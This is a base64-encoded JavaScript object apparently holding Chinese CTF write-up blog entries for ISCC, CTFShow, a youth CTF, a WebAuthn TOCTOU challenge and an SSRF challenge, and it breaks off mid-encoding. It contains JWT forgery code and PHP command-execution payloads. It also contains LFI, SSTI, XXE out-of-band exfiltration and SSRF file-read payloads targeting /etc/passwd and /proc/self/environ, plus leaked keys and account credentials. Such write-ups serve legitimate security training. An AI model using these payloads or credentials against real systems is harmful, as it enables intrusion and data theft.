dTRFRTNcdTc4MDFcdTRFMkRcdTY3MDlcdTUzRDhcdTkxQ0ZcdTg5ODZcdTc2RDZcdTZGMEZcdTZEMUVcdUZGMENcdTkxNERcdTU0MDggUEhQIFx1NUYzMVx1N0M3Qlx1NTc4Qlx1N0VENVx1OEZDN1x1MzAwMlxyXG5cclxuXFxgXFxgXFxgcGhwXHJcbi8vIFx1NjgzOFx1NUZDM1x1NEVFM1x1NzgwMVx1RkYxQVx1NTNEOFx1OTFDRlx1ODk4Nlx1NzZENlxyXG5mb3JlYWNoKCRfR0VUIGFzICRrID0+ICR2KSAkJGsgPSAkdjtcclxuXHJcbi8vIFx1NzEzNlx1NTQwRVx1NzUyOCA9PT0gXHU1MDVBXHU0RTI1XHU2ODNDXHU1MjI0XHU2NUFEXHJcbmlmICgka2V5ID09PSBcInNlY3JldF92YWx1ZVwiKSB7IC4uLiB9XHJcblxcYFxcYFxcYFxyXG5cclxuKipcdTdFRDVcdThGQzdcdTY1QjlcdTZDRDUqKlx1RkYxQVx1OTAxQVx1OEZDNyBVUkwgXHU1M0MyXHU2NTcwIFxcYD9rZXk9W11cXGAgXHU0RjIwXHU1MTY1XHU3QTdBXHU2NTcwXHU3RUM0XHVGRjBDXHU1MjI5XHU3NTI4IFBIUCBcdTc2ODRcdTUzRDhcdTkxQ0ZcdTg5ODZcdTc2RDZcdTY3M0FcdTUyMzZcdTg5ODZcdTc2RDYgXFxgJGtleVxcYFx1MzAwMlxyXG5cclxuKipcdTdFQ0ZcdTlBOEMqKlx1RkYxQVxyXG4xLiBcdTY3RTVcdTc3MEJcdTZFOTBcdTc4MDFcdTZDRThcdTkxQ0FcdUZGMENcdTkwQTNcdTkxQ0NcdTVGODBcdTVGODBcdTg1Q0ZcdTc3NDBcdThERUZcdTc1MzFcdTYzRDBcdTc5M0FcdTU0OENcdTUxNzNcdTk1MkVcdTUzQzJcdTY1NzBcclxuMi4gXHU3QTdBXHU2NTcwXHU3RUM0IFxcYFtdXFxgIFx1NEUwRVx1NUI1N1x1N0IyNlx1NEUzMi9cdTY1NzBcdTVCNTdcdTc2ODRcdTZCRDRcdThGODNcdTg4NENcdTRFM0FcdTY2MkYgUEhQIFx1NUYzMVx1N0M3Qlx1NTc4Qlx1NzY4NFx1N0NCRVx1OUFEM1xyXG4zLiBcdTUzRDhcdTkxQ0ZcdTg5ODZcdTc2RDYgXFxgZm9yZWFjaCgkJGspXFxgIFx1NTNFRlx1NEVFNVx1OTAxQVx1OEZDN1x1NEYyMFx1NTNDMlx1ODk4Nlx1NzZENlx1NEVGQlx1NjEwRlx1NTNEOFx1OTFDRlxyXG5cclxuLS0tXHJcblxyXG4qKlx1OEUyOVx1NTc1MVx1NjU1OVx1OEJBRCoqXHVGRjFBXHJcbjEuIENURiBcdTRFMkRcdTRFMERcdTg5ODFcdTZGMEZcdTYzODlcdTRFRkJcdTRGNTVcdTk4NzVcdTk3NjJcdTZFOTBcdTc4MDFcdTc2ODRcdTZDRThcdTkxQ0FcclxuMi4gTEZJIFx1N0E3Rlx1OEQ4QVx1NkRGMVx1NUVBNlx1ODk4MVx1NTkyN1x1ODBDNlx1OEJENVx1RkYwQ1x1NEVDRSAxIFx1N0VBN1x1NTIzMCAxMCBcdTdFQTdcdTkwMTBcdTRFMDBcdTYzOTJcdTY3RTVcclxuMy4gSURPUiBcdTc2ODRcdTUzQzJcdTY1NzBcdTUwM0NcdTRFMERcdTg5ODFcdTUzRUFcdTc3MEJcdTg4NjhcdTk3NjJcdUZGMENcdThBNjZcdThBNjZcdTc2RjhcdTkwQkJcdTc2ODQgSURcclxuNC4gU1NSRiBcdTRFMkRcdTRFMERcdTU0MENcdTUzNEZcdThCQUVcdTg4NENcdTRFM0FcdTVERUVcdTVGMDJcdTVGODhcdTU5MjdcdUZGMENnb3BoZXIvZGljdC9maWxlIFx1NEUwMFx1NUI5QVx1ODk4MVx1OTBGRFx1OEJENVxyXG5gXHJcbiAgfSxcclxuICBcIm1heS0yMDI2XCI6IHtcclxuICAgIHRpdGxlOiBcIkNURiBXcml0ZXVwIC0gMjAyNlx1NUU3NDVcdTY3MDhcIixcclxuICAgIHN1YnRpdGxlOiBcIklTQ0MgLyBcdTk3NTJcdTVDOTEgLyBDVEZTaG93XCIsXHJcbiAgICBjb250ZW50OiBgXHJcbiMgQ1RGIFdyaXRldXAgLSAyMDI2XHU1RTc0NVx1NjcwOCAoXHU2MjJBXHU4MUYzNVx1NjcwODZcdTY1RTUpXHJcblxyXG4jIyBcdTRFMDBcdTMwMDFJU0NDIENURiBXZWIgKFx1ODlFM1x1NTFGQSBcXHVkODNkXFx1ZGQyNSlcclxuXHJcbioqXHU5ODk4XHU3NkVFKio6IFxcYGh0dHA6Ly8zOS4xMDUuMjEzLjI4OjQ5MTA2XFxgXHJcbioqRkxBRyoqOiBcXGBJU0NDe0s2RlJGeUhBTWFNbVBaTm1YWHBBfVxcYFxyXG5cclxuIyMjIFx1NjUzQlx1NTFGQlx1OTRGRVxyXG5cclxuIyMjIyAxLiBcXGAuZ2l0XFxgIFx1NkU5MFx1NzgwMVx1NkNDNFx1OTczMlxyXG5cXGBcXGBcXGBiYXNoXHJcbiMgXHU3NTI4IGdpdF9kdW1wZXIgXHU1MTRCXHU5Njg2XHU0RUQzXHU1RTkzXHJcbnB5dGhvbiBnaXRfZHVtcGVyLnB5IGh0dHA6Ly8zOS4xMDUuMjEzLjI4OjQ5MTA2Ly5naXQvIC4vaXNjY19naXQvXHJcblxyXG4jIFx1NjdFNVx1NzcwQiBnaXQgXHU1Mzg2XHU1M0YyXHVGRjBDXHU2MjdFXHU1MjMwXHU2NUU3XHU3MjQ4XHU2NzJDXHJcbmdpdCBsb2cgLS1hbGwgLS1vbmVsaW5lXHJcbmdpdCBzaG93IDxjb21taXRfaWQ+OmxlZ2FjeV9wcm9iZV9zdHViLnB5XHJcblxcYFxcYFxcYFxyXG5cclxuXHU0RUNFIFxcYC5naXQvb2JqZWN0c1xcYCBcdTRFMkRcdThGRDhcdTUzOUZcdTRFODZcdTY1RTdcdTcyNDggXFxgbGVnYWN5X3Byb2JlX3N0dWIucHlcXGBcdUZGMENcdTgzQjdcdTUzRDZcdTRFMjRcdTRFMkFcdTUxNzNcdTk1MkVcdTVCQzZcdTk0QTVcdUZGMUFcclxuLSAqKkpXVCBcdTVCQzZcdTk0QTUqKjogXFxgSVNDQ18yMDI2X0pXVF9ERUJVR19LRVlfIzk1MjdcXGBcclxuLSAqKlx1NjVFN1x1NzI0OCBITUFDIFx1NUJDNlx1OTRBNSoqOiBcXGBJU0NDX1NFUlZFUl9TRUNSRVRfUkVBTFxcYFxyXG5cclxuIyMjIyAyLiBcdTc2N0JcdTVGNTVcclxuXFxgXFxgXFxgXHJcblx1NzUyOFx1NjIzN1x1NTQwRDogYXVkaXRvclxyXG5cdTVCQzZcdTc4MDE6IGF1ZGl0MjAyNVxyXG5cXGBcXGBcXGBcclxuXHVGRjA4XHU0RUNFIGdpdCBcdTUzODZcdTUzRjJcdTYyMTZcdTZFOTBcdTc4MDFcdTRFMkRcdTYyN0VcdTUyMzBcdTc2ODRcdTUxRURcdTYzNkVcdUZGMDlcclxuXHJcbiMjIyMgMy4gSFMyNTYgSldUIFx1NEYyQVx1OTAyMFxyXG5cXGBcXGBcXGBweXRob25cclxuaW1wb3J0IGp3dFxyXG5wYXlsb2FkID0ge1wic3ViXCI6IFwiYXVkaXRvcl9pZFwiLCBcInJvbGVcIjogXCJhdWRpdG9yXCIsIFwiZXhwXCI6IDk5OTk5OTk5OTl9XHJcbnRva2VuID0gand0LmVuY29kZShwYXlsb2FkLCBcIklTQ0NfMjAyNl9KV1RfREVCVUdfS0VZXyM5NTI3XCIsIGFsZ29yaXRobT1cIkhTMjU2XCIpXHJcbiMgXHU1QzA2IHRva2VuIFx1NTg2Qlx1NTE2NSBDb29raWU6IGp3dF90b2tlbj14eHhcclxuXFxgXFxgXFxgXHJcblxyXG4jIyMjIDQuIFx1NTE3M1x1OTUyRVx1N0VENVx1OEZDN1x1RkYxQVx1NTM1NVx1NzJFQ1x1NTNEMVx1OTAwMSBKV1RcclxuXHU4QkJGXHU5NUVFIFxcYC9hdWRpdG9yL25vZGVzXFxgIFx1NjVGNlx1RkYxQVxyXG4tICoqRmxhc2sgc2Vzc2lvbiArIEpXVCBcdTU0MENcdTY1RjZcdTVCNThcdTU3MjgqKiBcdTIxOTIgXHU4RDcwXHU5ODlEXHU1OTE2XHU2ODIxXHU5QThDXHU5MDNCXHU4RjkxXHVGRjA4XHU2MkQyXHU3RUREXHVGRjA5XHJcbi0gKipcdTUzNTVcdTcyRUMgSldUIGNvb2tpZVx1RkYwOFx1NjVFMCBzZXNzaW9uXHVGRjA5KiogXHUyMTkyIFx1NjcwRFx1NTJBMVx1N0FFRlx1NTNFQVx1NjgyMVx1OUE4QyBKV1QgXHU0RTBEXHU2ODIxXHU5QThDIHNlc3Npb24gXHUyMTkyICoqMjAwIFx1NjUzRVx1ODg0Q1x1RkYwMSoqXHJcblxyXG5cdThGRDlcdTY2MkYgRmxhc2sgKyBKV1QgXHU2REY3XHU1NDA4XHU4QkE0XHU4QkMxXHU5MDNCXHU4RjkxXHU3Njg0XHU2RjBGXHU2RDFFXHU1MjI5XHU3NTI4XHUzMDAyXHJcblxyXG4jIyMjIDUuIFx1NTE4NVx1OTBFOCBBUEkgSE1BQyBcdTdCN0VcdTU0MERcclxuXHU1NzI4IFxcYC9hdWRpdG9yL25vZGVzXFxgIFx1OTg3NVx1OTc2Mlx1NjNEMFx1NEVBNFx1NjdFNVx1OEJFMlx1NjVGNlx1RkYwQ1x1OTcwMFx1NUJGOSBcXGBub2RlX2lkOnRpbWVzdGFtcFxcYCBcdThGREJcdTg4NEMgSE1BQy1TSEEyNTYgXHU3QjdFXHU1NDBEXHVGRjFBXHJcblxcYFxcYFxcYHB5dGhvblxyXG5pbXBvcnQgaG1hYywgaGFzaGxpYiwgdGltZVxyXG5cclxubm9kZV9pZCA9IFwiY29yZS1zdG9yYWdlLTAxXCJcclxudGltZXN0YW1wID0gc3RyKGludCh0aW1lLnRpbWUoKSkpXHJcbm1zZyA9IGZcIntub2RlX2lkfTp7dGltZXN0YW1wfVwiXHJcbnNpZyA9IGhtYWMubmV3KFxyXG4gICAgXCJJU0NDX1NFUlZFUl9TRUNSRVRfUkVBTFwiLmVuY29kZSgpLFxyXG4gICAgbXNnLmVuY29kZSgpLFxyXG4gICAgaGFzaGxpYi5zaGEyNTZcclxuKS5oZXhkaWdlc3QoKVxyXG4jIFx1NUMwNiBzaWdcdTMwMDFub2RlX2lkXHUzMDAxdGltZXN0YW1wIFx1NEY1Q1x1NEUzQVx1OEJGN1x1NkM0Mlx1NTNDMlx1NjU3MFx1NjNEMFx1NEVBNFxyXG5cXGBcXGBcXGBcclxuXHJcbiMjIyMgNi4gRmxhZyBcdTgzQjdcdTUzRDZcclxuXHU3QjdFXHU1NDBEXHU5QThDXHU4QkMxXHU5MDFBXHU4RkM3XHU1NDBFXHVGRjBDXHU4RkQ0XHU1NkRFIGZsYWdcdTMwMDJcclxuXHJcbi0tLVxyXG5cclxuIyMgXHU0RThDXHUzMDAxXHU5NzUyXHU1QzkxIENURlx1RkYwODEyMC8xMjAgXHU0RTAwXHU4ODQwXHU5MDFBXHU1MTczIFxcdWQ4M2NcXHVkZjFmXHVGRjA5XHJcblxyXG4qKlx1NUU3M1x1NTNGMCoqOiBjdGYuamlucWl1amVjLmNvbVxyXG4qKlx1NjIxOFx1N0VFOSoqOiAxMjBcdTk4OThcdTUxNjhcdTkwRThcdTg5RTNcdTdCNTRcdUZGMEMxMDAlXHU0RTAwXHU4ODQwXHU3Mzg3XHJcblxyXG4jIyMgXHU1MTczXHU5NTJFXHU4OUUzXHU5ODk4XHU2MjgwXHU2NzJGXHJcblxyXG58IFx1OTg5OFx1NTc4QiB8IFx1OTg5OFx1NzZFRSB8IFx1NjI4MFx1NjcyRlx1ODk4MVx1NzBCOSB8XHJcbnwtLS0tLS18LS0tLS0tfC0tLS0tLS0tLXxcclxufCBFWklORk9MRUFLXzJ+NSB8IE1JU0MgfCBcXGAvcHJvYy9zZWxmL2Vudmlyb25cXGAgXHU2Q0M0XHU5NzMyXHU4REVGXHU1Rjg0XHVGRjBDcGhwaW5mbyBcdTYyN0VcdTZFOTBcdTc4MDFcdUZGMENcXGAuZ2l0XFxgIFx1NjZCNFx1OTczMiB8XHJcbnwgSldUIHwgV0VCIHwgSFMyNTYgXHU1RjMxXHU1QkM2XHU5NEE1XHU3MjA2XHU3ODM0IFxcYHJvY2t5b3UudHh0XFxgIHxcclxufCBTU1RJIHwgV0VCIHwgXFxgdXJsX2Zvci5fX2dsb2JhbHNfX1snb3MnXS5wb3BlbigpXFxgICsgXHU1MTk5XHU2NTg3XHU0RUY2XHU1MjMwIHN0YXRpYyBcdTc2RUVcdTVGNTUgfFxyXG58IFNTUkYgfCBXRUIgfCBnb3BoZXIgXHU2MjUzIFJlZGlzL2dvcGhlciBcdTYyNTMgRmFzdENHSVx1MzAwMVx1OEZEQlx1NTIzNlx1OEY2Q1x1NjM2Mlx1N0VENVx1OEZDN1x1OUVEMVx1NTQwRFx1NTM1NSB8XHJcbnwgWFhFIHwgV0VCIHwgXHU1M0MyXHU2NTcwXHU1QjlFXHU0RjUzICsgXFxgaW50ZXJhY3RzaC5vYXN0Lm9ubGluZVxcYCBcdTU5MTZcdTVFMjZcdTY1NzBcdTYzNkUgfFxyXG58IFx1NjU4N1x1NEVGNlx1NEUwQVx1NEYyMCB8IFdFQiB8IFxcYC51c2VyLmluaVxcYCArIFxcYGF1dG9fcHJlcGVuZF9maWxlPTEucG5nXFxgIFx1ODlFM1x1Njc5MFx1N0VENVx1OEZDNyB8XHJcbnwgXHU2NzYxXHU0RUY2XHU3QURFXHU0RTg5IHwgV0VCIHwgQlAgXHU1RTc2XHU1M0QxIDMwIFx1N0VCRlx1N0EwQlx1NTE5OSArIDgwIFx1N0VCRlx1N0EwQlx1OEJGQlx1NEUzNFx1NjVGNlx1NjU4N1x1NEVGNiB8XHJcbnwgXHU1M0NEXHU1RThGXHU1MjE3XHU1MzE2IHwgV0VCIHwgUE9QIFx1OTRGRVx1OTAwNlx1NjNBOFx1RkYxQVxcYF9fZGVzdHJ1Y3RcXGAgXHUyMTkyIFxcYF9fdG9TdHJpbmdcXGAgXHUyMTkyIFxcYF9faW52b2tlXFxgIFx1MjE5MiBcXGBfX3NldFxcYCBcdTIxOTIgXFxgX19nZXRcXGAgfFxyXG5cclxuIyMjIFx1NjcwMFx1NTQwRVx1NEUwMFx1OTg5OFx1RkYxQUVaSU5GT0xFQUtcclxuLSBMRkkgXHU2RjBGXHU2RDFFXHVGRjFBXFxgP3BhZ2U9Li4vLi4vZXRjL3Bhc3N3ZFxcYFxyXG4tIFx1OERFRlx1NUY4NFx1N0E3Rlx1OEQ4QVx1RkYxQVxcYC4uLy4uL2ZsNGcudHh0XFxgIFx1NzZGNFx1NjNBNVx1OEJGQlx1NTNENiBmbGFnXHJcblxyXG4tLS1cclxuXHJcbiMjIFx1NEUwOVx1MzAwMUNURlNob3cgQmFzaWNcdUZGMDhcdTkwRThcdTUyMDZcdTVCOENcdTYyMTBcdUZGMDlcclxuXHJcbioqXHU4RDI2XHU1M0Y3Kio6IGh3aDA4MTExNkBxcS5jb20gLyBQQHNzdzByZFxyXG5cclxuIyMjIFx1NURGMlx1ODlFM1x1OTg5OFx1NzZFRVxyXG5cclxufCBcdTk4OThcdTUzRjcgfCBcdTdDN0JcdTU3OEIgfCBcdTg5RTNcdTZDRDUgfFxyXG58LS0tLS0tfC0tLS0tLXwtLS0tLS18XHJcbnwgYmFzaWNfMX45IHwgTUlTQy9DcnlwdG8gfCBcdTU3RkFcdTc4NDBcdTk4OThcdTYyNzlcdTkxQ0ZcdTg5RTNcdTdCNTQgfFxyXG58IGJhc2ljXzExIHwgV0VCIHwgSldUIFx1NzIwNlx1NzgzNCB8XHJcbnwgYmFzaWNfMTIgfCBXRUIgfCBcdTU3RkFcdTc4NDAgU1FMIFx1NkNFOFx1NTE2NSB8XHJcbnwgKip3ZWIxMSoqIHwgV0VCIHwgKipQSFAgZXZhbCBcdTZDRThcdTUxNjUqKiB8XHJcblxyXG4jIyMgd2ViMTEgXHU4OUUzXHU2Q0Q1XHJcblxcYFxcYFxcYFxyXG5VUkw6IGh0dHA6Ly9jaGFsbGVuZ2UuY3RmLnNob3c6ODA4MC9cclxuUGF5bG9hZDogc3lzdGVtKCRfR0VUWydjbWQnXSk7JmNtZD1sc1xyXG5GTEFHOiBjdGZzaG93ezY0NzQ1NzZlLTUzOTItNGY4MS1iNDZmLWQ0NzczZjc2MjFmYX1cclxuXFxgXFxgXFxgXHJcblxyXG4tLS1cclxuXHJcbiMjIFx1NTZEQlx1MzAwMVBhc3NLZXkgV2ViQXV0aG4gQ1RGXHVGRjA4VE9DVE9VIFx1NkYwRlx1NkQxRVx1NTNEMVx1NzNCMCBcXHVkODNkXFx1ZGQyNVx1RkYwOVxyXG5cclxuKipcdTk3NzZcdTU3M0EqKjogXFxgZG9ja2VyLnFpbmdjZW4ubmV0OjQ2OTAwXFxgXHJcbioqXHU3MkI2XHU2MDAxKio6IFx1OTc3Nlx1NTczQVx1NzlCQlx1N0VCRlx1RkYwQ1x1NEY0Nlx1NkYwRlx1NkQxRVx1NTIwNlx1Njc5MFx1NURGMlx1NUI4Q1x1NjIxMFxyXG5cclxuIyMjIFx1NkYwRlx1NkQxRVx1RkYxQVRPQ1RPVSBcdTY3NjFcdTRFRjZcdTdBREVcdTRFODlcclxuXHJcbioqXHU0RjREXHU3RjZFKio6IFxcYGFwcC5weVxcYCBcdTdCMkMyMTUtMjY4XHU4ODRDIFxcYGxvZ2luX2ZpbmlzaFxcYCBcdTUxRkRcdTY1NzBcclxuXHJcblxcYFxcYFxcYHB5dGhvblxyXG4jIFx1NkYwRlx1NkQxRVx1NEVFM1x1NzgwMVxyXG5pZiBub3Qgc3RhdGUuZ2V0KFwidmVyaWZpY2F0aW9uX2NvbXBsZXRlXCIpOlxyXG4gICAgIyAuLi4gXHU5QThDXHU4QkMxXHU5MDNCXHU4RjkxXHVGRjA4XHU0RUM1XHU3QjJDXHU0RTAwXHU2QjIxXHU2MjY3XHU4ODRDXHVGRjA5Li4uXHJcbiAgICBzdGF0ZVtcInZlcmlmaWNhdGlvbl9jb21wbGV0ZVwiXSA9IFRydWUgICMgXHUyMTkwIFx1NjgwN1x1OEJCMFx1NURGMlx1NUI4Q1x1NjIxMFxyXG5cclxuIyBcXHUyNmEwXFx1ZmUwZiBcdTUxNzNcdTk1MkVcdTZGMEZcdTZEMUVcdUZGMUFcdTRGN0ZcdTc1MjhcdTY1M0JcdTUxRkJcdTgwMDVcdTYzRDBcdTRGOUJcdTc2ODRJRFx1ODAwQ1x1OTc1RVx1NURGMlx1OUE4Q1x1OEJDMVx1NzY4NElEXHJcbmZpbmFsX2NyZWRlbnRpYWwgPSBnZXRfY3JlZGVudGlhbF9ieV9pZChwcmVzZW50ZWRfY3JlZGVudGlhbF9pZCkgICMgXHUyMTkwIFx1NjUzQlx1NTFGQlx1ODAwNVx1NTNFRlx1NjNBN1x1RkYwMVxyXG5maW5hbF91c2VyID0gZ2V0X3VzZXJfYnlfaWQoZmluYWxfY3JlZGVudGlhbC51c2VyX2lkKVxyXG5zZXNzaW9uW1widXNlcl9pZFwiXSA9IGZpbmFsX3VzZXIuaWQgICMgXHUyMTkwIFx1NjUzQlx1NTFGQlx1ODAwNVx1NjNBN1x1NTIzNlx1NzY3Qlx1NUY1NVx1OEMwMVxyXG5cXGBcXGBcXGBcclxuXHJcbiMjIyBcdTY1M0JcdTUxRkJcdTUzOUZcdTc0MDZcclxuXHJcbjEuIFx1NkNFOFx1NTE4Q1x1NjY2RVx1OTAxQVx1NzUyOFx1NjIzN1x1RkYwQ1x1ODNCN1x1NTNENlx1NjcwOVx1NjU0OCBjcmVkZW50aWFsXHJcbjIuIFxcYGxvZ2luL2JlZ2luXFxgIFx1ODNCN1x1NTNENiBjaGFsbGVuZ2VcclxuMy4gKipcdTdCMkNcdTRFMDBcdTZCMjEgXFxgbG9naW4vZmluaXNoXFxgKipcdUZGMUFcdTc1MjhcdTgxRUFcdTVERjEgY3JlZGVudGlhbCBcdTlBOENcdThCQzEgXHUyMTkyIFxcYHZlcmlmaWNhdGlvbl9jb21wbGV0ZT1UcnVlXFxgXHJcbjQuICoqXHU3QUNCXHU1MzczXHU1M0QxXHU5MDAxXHU3QjJDXHU0RThDXHU2QjIxIFxcYGxvZ2luL2ZpbmlzaFxcYCoqXHVGRjFBXHU2M0QwXHU0RUE0ICoqYWRtaW4gXHU3Njg0IGNyZWRlbnRpYWxfaWQqKiBcdTIxOTIgXHU4REYzXHU4RkM3XHU5QThDXHU4QkMxXHVGRjA4XHU1NkUwXHU0RTNBXHU1REYyXHU1QjhDXHU2MjEwXHVGRjA5XHUyMTkyIFx1NEY0NiBcXGBmaW5hbF9jcmVkZW50aWFsXFxgIFx1NEY3Rlx1NzUyOFx1NjUzQlx1NTFGQlx1ODAwNVx1NjNEMFx1NEVBNFx1NzY4NCBJRCBcdTIxOTIgKipcdTRFRTUgYWRtaW4gXHU4RUFCXHU0RUZEXHU3NjdCXHU1RjU1XHVGRjAxKipcclxuXHJcbioqXHU1REYyXHU3N0U1IGFkbWluIFx1NTFFRFx1OEJDMSBJRCoqOiBcXGBBX1h4TWlsUFlzWmIzdmkydGxsU1BsLTNnbFdRRDRPSXBFSmZBdmhMc0lcXGBcclxuXHJcbi0tLVxyXG5cclxuIyMgXHU0RTk0XHUzMDAxXHU2MjgwXHU4MEZEXHU1QjY2XHU0RTYwXHU2MDNCXHU3RUQzXHJcblxyXG4jIyMgXHU5QUQ4XHU5ODkxXHU3QjJDXHU0RTAwXHU2NzdGXHU2NUE3XHVGRjA4V2ViXHVGRjA5XHJcblxyXG58IFx1OTg5OFx1NTc4QiB8IFx1OTk5Nlx1OTAwOVx1NjNBMlx1NkQ0QiB8XHJcbnwtLS0tLS18LS0tLS0tLS0tfFxyXG58IFNRTFx1NkNFOFx1NTE2NSB8IFxcYCcgb3IgMT0xI1xcYCBcdTRFMDdcdTgwRkRcdTVCQzZcdTc4MDEgfFxyXG58IFx1NjU4N1x1NEVGNlx1NEUwQVx1NEYyMCB8IEYxMiBcdTc5ODEgSlMgXHU0RjIwIFxcYC5waHBcXGAgfFxyXG58IFNTUkYgfCBcXGBodHRwOi8vMTI3LjAuMC4xOnBvcnQvYWRtaW5cXGAgfFxyXG58IFNTVEkgfCBcXGB7ezcqN319XFxgIFx1NTZERVx1NjYzRVx1NjNBMlx1NkQ0QiB8XHJcbnwgWFhFIHwgXFxgPCFFTlRJVFkgeHhlIFNZU1RFTSBcImZpbGU6Ly8vZmxhZ1wiPlxcYCB8XHJcbnwgSldUIHwgXHU2MjkzIHRva2VuIFx1NzIwNlx1NzgzNCBzZWNyZXQgfFxyXG58IC5naXRcdTZDQzRcdTk3MzIgfCBcXGBnaXRfZHVtcGVyLnB5XFxgIHxcclxuXHJcbiMjIyBcdTY1RTBcdTVCNTdcdTZCQ0RcdTY1NzBcdTVCNTcgUkNFIDYgXHU3OUNEXHU2MjRCXHU2Q0Q1XHJcblxyXG4xLiAqKlhPUiBcdTVGMDJcdTYyMTYqKjogXHU5MDEwXHU1QjU3XHU3QjI2IFhPUiBcdTY3ODRcdTkwMjAgcGF5bG9hZFxyXG4yLiAqKk9SIFx1NjIxNlx1OEZEMFx1N0I5NyoqOiBcdTkwMTBcdTVCNTdcdTdCMjYgT1IgXHU2Nzg0XHU5MDIwXHJcbjMuICoqUEhQIFx1OTY5MFx1NUYwRlx1NjJGQ1x1NjNBNSoqOiBcXGBcInN5c1wiLlwidGVtXCJcXGAgXHU1QjU3XHU3QjI2XHU0RTMyXHU2MkZDXHU2M0E1XHJcbjQuICoqXHU1M0NEXHU1RjE1XHU1M0Y3XHU2MjY3XHU4ODRDKio6IFxcYFxcYCRuZVxcYFxcYFxyXG41LiAqKlx1NTNEOFx1OTFDRlx1NTFGRFx1NjU3MCoqOiBcXGAkJF8oKVxcYCBcdTUyQThcdTYwMDFcdThDMDNcdTc1MjhcclxuNi4gKipcdTUxNkJcdThGREJcdTUyMzZcdThGNkNcdTRFNDkqKjogXFxgJCdcXFxcMTQzXFxcXDE0MVxcXFwxNjQnXFxgXHJcblxyXG4tLS1cclxuXHJcbiMjIFx1NTE2RFx1MzAwMVx1OTc3Nlx1NTczQVx1NzJCNlx1NjAwMVx1NjAzQlx1N0VEM1xyXG5cclxufCBcdTk3NzZcdTU3M0EgfCBcdTcyQjZcdTYwMDEgfCBcdTU5MDdcdTZDRTggfFxyXG58LS0tLS0tfC0tLS0tLXwtLS0tLS18XHJcbnwgXHU5NzUyXHU1QzkxIENURiB8IFxcdTI3MDUgMTIwLzEyMCBcdTUxNjhcdTkwMUEgfCAxMDAlIFx1NEUwMFx1ODg0MFx1RkYwQ1x1N0I0OVx1NUY4NVx1NjZGNFx1NjVCMCB8XHJcbnwgSVNDQyBDVEYgfCBcXHUyNzA1IFx1ODlFM1x1NTFGQSAxIFx1OTg5OCB8IFdlYiBcdTk4OTggZmxhZyBcdTVERjJcdTYyRkYgfFxyXG58IENURlNob3cgYmFzaWMgfCBcXHVkODNkXFx1ZGQzNCBcdTkwRThcdTUyMDZcdTVCOENcdTYyMTAgfCBiYXNpY18xMCBJRE9SIFx1NjcyQVx1ODlFMyB8XHJcbnwgUGFzc0tleSBXZWJBdXRobiB8IFxcdTIzZjhcXHVmZTBmIFx1OTc3Nlx1NTczQVx1NzlCQlx1N0VCRiB8IFRPQ1RPVSBcdTZGMEZcdTZEMUVcdTVERjJcdTUyMDZcdTY3OTAgfFxyXG5cclxuLS0tXHJcblxyXG4qXHU3NTFGXHU2MjEwXHU2NUY2XHU5NUY0OiAyMDI2LTA1LTA2KlxyXG4qXHU1MzVBXHU1QkEyXHU1NzMwXHU1NzQwOiBodHRwczovL2hlbGl1bXNlbmJyZy5naXRodWIuaW8vY3RmLXdyaXRldXAtYmxvZy8qXHJcbmBcclxuICB9LFxyXG4gIG5vcnRoYnJpZGdlOiB7XHJcbiAgICB0aXRsZTogJ05vcnRoYnJpZGdlIC0tIFNTUkYgQnlwYXNzJyxcclxuICAgIHN1YnRpdGxlOiAnU1NSRiB2aWEga2tmaWxldmlldyBnZXRDb3JzRmlsZScsXHJcbiAgICBjb250ZW50OiBgXHJcbk5vcnRoYnJpZGdlIFx1NjYyRlx1NEUwMFx1OTA1M1x1NTE3OFx1NTc4Qlx1NzY4NCBTU1JGIFx1OTg5OFx1MzAwMlx1NjcwRFx1NTJBMVx1N0FFRlx1OTZDNlx1NjIxMFx1NEU4NiBra2ZpbGV2aWV3XHVGRjBDXHU1MTc2XHU0RTJEIGdldENvcnNGaWxlIFx1NjNBNVx1NTNFM1x1NzZGNFx1NjNBNVx1OEJGQlx1NTNENlx1NzUyOFx1NjIzN1x1NjNEMFx1NEY5Qlx1NzY4NCBVUkwgXHU1RTc2XHU4RkQ0XHU1NkRFXHU1MTg1XHU1QkI5XHVGRjBDXHU2Q0ExXHU2NzA5XHU0RUZCXHU0RjU1XHU3NjdEXHU1NDBEXHU1MzU1XHU2ODIxXHU5QThDXHUzMDAyXHJcblxyXG4jIyBcdTZGMEZcdTZEMUVcdTcwQjlcclxuXHJcblxcYFxcYFxcYGphdmFzY3JpcHRcclxuR0VUIC9ra2ZpbGV2aWV3L2dldENvcnNGaWxlP3VybFBhdGg9aHR0cDovL3RhcmdldC9zZXJ2aWNlXHJcblxcYFxcYFxcYFxyXG5cclxuXFxgdXJsUGF0aFxcYCBcdTVCOENcdTUxNjhcdTUzRUZcdTYzQTdcdUZGMENcdTUzRUZcdTRFRTVcdTYzMDdcdTU0MTFcdTUxODVcdTdGNTFcdTY3MERcdTUyQTFcdTYyMTZcdTY3MkNcdTU3MzBcdTY1ODdcdTRFRjZcdTMwMDJcclxuXHJcbiMjIFx1NTM0Rlx1OEJBRVx1NjNBMlx1NkQ0QlxyXG5cclxufCBcdTdDN0JcdTU3OEIgfCBcdTc5M0FcdTRGOEIgfCBcdTdFRDNcdTY3OUMgfFxyXG58LS0tLS0tfC0tLS0tLXwtLS0tLS18XHJcbnwgSFRUUCAxMjcuMC4wLjEgfCBodHRwOi8vMTI3LjAuMC4xOjgwODAgfCBcdTg4QUJcdTYyRTZcdTYyMkEgfFxyXG58IGZpbGU6Ly8gfCBmaWxlOi8vL2V0Yy9wYXNzd2QgfCBcdTYyMTBcdTUyOUYgfFxyXG58IGdvcGhlcjovLyB8IGdvcGhlcjovLzEyNy4wLjAuMTo2Mzc5L19pbmZvIHwgXHU4RDg1XHU2NUY2IHxcclxuXHJcbioqXHU1MTczXHU5NTJFXHU1M0QxXHU3M0IwXHVGRjFBZmlsZTovLyBcdTc2RjRcdTYzQTVcdThCRkJcdTY3MkNcdTU3MzBcdTY1ODdcdTRFRjZcdTY3MDBcdTY3MDlcdTY1NDhcdTMwMDIqKlxyXG5cclxuIyMgXHU4QkZCXHU1M0Q2IGZsYWdcclxuXHJcblxcYFxcYFxcYGJhc2hcclxuZmlsZTovLy9mbGFnXHJcbmZpbGU6Ly8vYXBwL2luZGV4LnBocFxyXG5maWxlOi8vL3Byb2Mvc2VsZi9lbnZpcm9uXHJcblxcYFxcYFxcYFxyXG5cclxuXHU0RUNFIC9wcm9jL3NlbGYvZW52aXJvbiBcdTRFMkRcdTUzRDFcdTczQjBcdTRFODZcdTczQUZcdTU4ODNcdTUzRDhcdTkxQ0ZcdTZDQzRcdTk3MzJcdUZGMENcdTUzMDVcdTU0MkJcd